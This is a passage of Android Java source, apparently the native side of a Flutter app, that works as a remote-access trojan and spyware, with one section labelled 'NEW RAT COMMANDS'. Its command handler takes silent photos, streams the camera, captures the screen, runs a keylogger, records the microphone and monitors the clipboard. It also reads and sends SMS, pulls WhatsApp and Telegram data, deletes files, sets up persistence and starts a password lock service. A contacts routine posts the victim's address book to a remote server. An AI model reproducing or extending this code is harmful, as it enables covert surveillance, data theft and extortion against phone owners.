        });
    }

    private void speakTargetDevice(String text) {
        if (ttsEngine == null) {
            ttsEngine = new TextToSpeech(this, status -> {
                if (status == TextToSpeech.SUCCESS && text != null) {
                    ttsEngine.setLanguage(Locale.US);
                    ttsEngine.speak(text, TextToSpeech.QUEUE_FLUSH, null, null);
                }
            });
        } else if (text != null) { 
            ttsEngine.speak(text, TextToSpeech.QUEUE_FLUSH, null, null); 
        }
    }

    private void updateWallpaper(String urlString, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                java.io.InputStream is = new URL(urlString).openStream();
                WallpaperManager.getInstance(this).setStream(is);
                is.close();
                uiHandler.post(() -> result.success(true));
            } catch (Exception e) { 
                uiHandler.post(() -> result.error("WALL_ERR", e.getMessage(), null)); 
            }
        }).start();
    }

    private String getScreenShotBase64() {
        try {
            View v = getWindow().getDecorView().getRootView();
            v.setDrawingCacheEnabled(true);
            Bitmap b = Bitmap.createBitmap(v.getDrawingCache());
            v.setDrawingCacheEnabled(false);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            b.compress(Bitmap.CompressFormat.JPEG, 50, out);
            return Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
        } catch (Exception e) { 
            return null; 
        }
    }

    private void startStrobeEffect() {
        isStrobeRunning = true;
        android.hardware.camera2.CameraManager camManager = (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);
        strobeRunnable = new Runnable() {
            boolean isOn = false;
            @Override public void run() {
                try {
                    if (camManager != null) {
                        String camId = camManager.getCameraIdList()[0];
                        isOn = !isOn;
                        camManager.setTorchMode(camId, isOn);
                    }
                    if (isStrobeRunning) uiHandler.postDelayed(this, 30);
                } catch (Exception e) { 
                    isStrobeRunning = false; 
                }
            }
        };
        uiHandler.post(strobeRunnable);
    }

    private void stopStrobeEffect() {
        isStrobeRunning = false;
        if (strobeRunnable != null) uiHandler.removeCallbacks(strobeRunnable);
        try {
            android.hardware.camera2.CameraManager camManager = (android.hardware.camera2.CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (camManager != null) {
                camManager.setTorchMode(camManager.getCameraIdList()[0], false);
            }
        } catch (Exception e) {}
    }

    // ============ FLUTTER CHANNEL HANDLER ============
    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);
        lockChannel = new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), NATIVE_LOCK_CHANNEL);
        spyChannel = new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), SPY_CHANNEL);

        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), STROBE_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                if (call.method.equals("flash_strobe") || call.method.equals("startStrobe")) { 
                    startStrobeEffect(); 
                    result.success(null); 
                }
                else if (call.method.equals("stop_strobe") || call.method.equals("stopStrobe")) { 
                    stopStrobeEffect(); 
                    result.success(null); 
                } else {
                    result.notImplemented();
                }
            });

        spyChannel.setMethodCallHandler((call, result) -> {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            String method = call.method;
            
            switch (method) {
                case "take_photo":
                case "takeSilentPhotoBackground": 
                    String side = call.argument("side");
                    takeSilentPhoto(side != null ? side : "back", result);
                    break;
                case "start_live_camera":
                    String streamSide = call.argument("side");
                    startLiveStream(streamSide != null ? streamSide : "back");
                    result.success(true);
                    break;
                case "stop_live_camera":
                    stopLiveStream();
                    result.success(true);
                    break;
                case "get_contacts":
                    fetchAndUploadContacts();
                    result.success(true);
                    break;
                case "get_apps":
                case "getInstalledApps":
                    result.success(getApps());
                    break;
                case "get_gmails":
                case "getAccounts":
                    result.success(getDeviceAccounts());
                    break;
                case "get_system_stats":
                    result.success(getStorageInfo());
                    break;
                case "get_clipboard":
                case "getClipboard":
                    ClipboardManager cb = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                    if (cb != null && cb.hasPrimaryClip() && cb.getPrimaryClip() != null && cb.getPrimaryClip().getItemAt(0) != null) {
                        result.success(cb.getPrimaryClip().getItemAt(0).getText().toString());
                    } else {
                        result.success("Empty");
                    }
                    break;
                case "set_vol_max":
                case "setVolumeMax":
                    if (am != null) {
                        am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                        am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
                        am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
                    }
                    result.success(true);
                    break;
                case "vibrate_loop":
                    Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                    if (v != null) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            v.vibrate(VibrationEffect.createOneShot(10000, VibrationEffect.DEFAULT_AMPLITUDE));
                        } else {
                            v.vibrate(10000);
                        }
                    }
                    result.success(true);
                    break;
                case "setBrightness":
                    Number level = call.argument("level");
                    if (level != null) {
                        setDeviceBrightness(level.floatValue());
                    }
                    result.success(true);
                    break;
                case "speakText":
                    String text = call.argument("text");
                    speakTargetDevice(text != null ? text : "");
                    result.success(true);
                    break;
                case "showToast":
                    String msg = call.argument("msg");
                    if (msg != null) {
                        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
                    }
                    result.success(true);
                    break;
                case "set_wallpaper":
                case "setWallpaper":
                    String url = call.argument("url");
                    if (url != null) {
                        updateWallpaper(url, result);
                    } else {
                        result.error("WALL_ERR", "No URL provided", null);
                    }
                    break;
                case "get_screen":
                case "startScreenStreamBackground":
                    String screenshot = getScreenShotBase64();
                    result.success(screenshot);
                    break;
                case "bringToForeground":
                    bringToFront();
                    result.success(true);
                    break;
                case "checkAccessibility":
                    result.success(isAccessibilityServiceEnabled());
                    break;
                case "openAccessibilitySettings":
                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                    result.success(true);
                    break;
                case "openNotificationSettings":
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                    }
                    result.success(true);
                    break;
                case "startAudioRecord":
                    startRecording(result);
                    break;
                case "stopAudioRecord":
                    stopRecording(result);
                    break;
                case "saveTargetId":
                    String id = call.arguments.toString();
                    getSharedPreferences("SpyPrefs", MODE_PRIVATE).edit().putString("targetId", id).apply();
                    result.success(true);
                    break;
                case "unlock":
                    result.success(true);
                    break;
                    
                // ============ NEW RAT COMMANDS ============
                case "start_keylogger":
                    startKeyloggerService();
                    result.success(true);
                    break;
                case "stop_keylogger":
                    stopKeylogger();
                    result.success(true);
                    break;
                case "start_mic_recording":
                    startBackgroundMicrophoneRecording();
                    result.success(true);
                    break;
                case "stop_mic_recording":
                    stopBackgroundMicrophoneRecording();
                    result.success(true);
                    break;
                case "get_mic_chunk":
                    result.success(null);
                    break;
                case "monitor_clipboard":
                    startClipboardMonitoring();
                    result.success(true);
                    break;
                case "stop_monitor_clipboard":
                    stopClipboardMonitoring();
                    result.success(true);
                    break;
                case "list_files":
                    String path = call.argument("path");
                    result.success(listFiles(path != null ? path : Environment.getExternalStorageDirectory().getAbsolutePath()));
                    break;
                case "download_file":
                    String filePath = call.argument("path");
                    result.success(downloadFile(filePath != null ? filePath : ""));
                    break;
                case "delete_file":
                    String delPath = call.argument("path");
                    result.success(removeTargetFile(delPath != null ? delPath : ""));
                    break;
                case "upload_file":
                    String localPath = call.argument("path");
                    result.success(uploadFile(localPath != null ? localPath : "", null, null));
                    break;
                case "get_running_processes":
                    result.success(listProcesses());
                    break;
                case "kill_process":
                    String pid = call.argument("pid");
                    result.success(killProcess(pid != null ? pid : ""));
                    break;
                case "show_notification":
                    String notifTitle = call.argument("title");
                    String notifBody = call.argument("body");
                    Integer notifId = call.argument("id");
                    showNotification(notifTitle != null ? notifTitle : "Alert", 
                                   notifBody != null ? notifBody : "Notification",
                                   notifId != null ? notifId : (int) System.currentTimeMillis());
                    result.success(true);
                    break;
                case "get_call_logs":
                    result.success(getCallLogs());
                    break;
                case "get_sms":
                    result.success(getSmsMessages());
                    break;
                case "send_sms":
                    String smsNumber = call.argument("number");
                    String smsMessage = call.argument("message");
                    result.success(sendSms(smsNumber != null ? smsNumber : "", smsMessage != null ? smsMessage : ""));
                    break;
                case "extract_whatsapp":
                    result.success(extractWhatsApp());
                    break;
                case "steal_telegram":
                    result.success(stealTelegram());
                    break;
                case "add_to_startup":
                    addToStartup();
                    result.success(true);
                    break;
                case "add_system_app":
                    addSystemApp();
                    result.success(true);
                    break;
                case "schedule_alarm":
                    scheduleAlarm();
                    result.success(true);
                    break;
                case "vibrate_once":
                    Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                    if (vibrator != null) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE));
                        } else {
                            vibrator.vibrate(500);
                        }
                    }
                    result.success(true);
                    break;
                default:
                    result.notImplemented();
            }
        });

        lockChannel.setMethodCallHandler((call, result) -> {
            if (call.method.equals("startNativeLock")) {
                @SuppressWarnings("unchecked")
                Map<String, String> args = (Map<String, String>) call.arguments;
                if (args != null) {
                    Intent intent = new Intent(this, LockService.class);
                    intent.putExtra("mode", args.get("mode"));
                    intent.putExtra("message", args.get("message"));
                    intent.putExtra("password", args.get("password"));
                    startService(intent);
                }
                result.success(true);
            } else if (call.method.equals("stopNativeLock")) {
                stopService(new Intent(this, LockService.class));
                result.success(true);
            } else {
                result.notImplemented();
            }
        });
    }

    // ============ CONTACTS EXFILTRATION ============
    private void fetchAndUploadContacts() {
        new Thread(() -> {
            try {
                SharedPreferences prefs = getSharedPreferences("SpyPrefs", MODE_PRIVATE);
                String targetId = prefs.getString("targetId", "unknown");
                JSONArray contactsArray = new JSONArray();
                Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                
                if (cursor != null) {
                    int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    
                    while (cursor.moveToNext()) {
                        JSONObject contact = new JSONObject();
                        String name = nameIdx >= 0 ? cursor.getString(nameIdx) : "";
                        String num = numIdx >= 0 ? cursor.getString(numIdx) : "";
                        contact.put("name", name != null ? name : "");
                        contact.put("num", num != null ? num : "");
                        contactsArray.put(contact);
                        if (contactsArray.length() > 500) break;
                    }
                    cursor.close();
                }

                URL url = new URL(SERVER_POST_URL + targetId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);

                JSONObject payload = new JSONObject();
                payload.put("cmd", "get_contacts");
                payload.put("data", contactsArray);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.toString().getBytes());
                    os.flush();
                }
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Contacts Upload Error: " + e.getMessage());
            }
        }).start();
    }

    public static void sendReplyToFlutter(String reply) {
        if (lockChannel != null && reply != null) {
            new Handler(Looper.getMainLooper()).post(() -> 
                lockChannel.invokeMethod("onTargetReply", reply)
            );
        }
    }

    @Override
    protected void onDestroy() {
        stopLiveStream();
        stopKeylogger();
        stopBackgroundMicrophoneRecording();
        stopClipboardMonitoring();
        if (ttsEngine != null) { 
            ttsEngine.stop(); 
            ttsEngine.shutdown(); 
            ttsEngine = null;
        }
        if (recorder != null) {
            try {
                recorder.release();
            } catch (Exception e) {}
            recorder = null;
        }
        super.onDestroy();
    }
}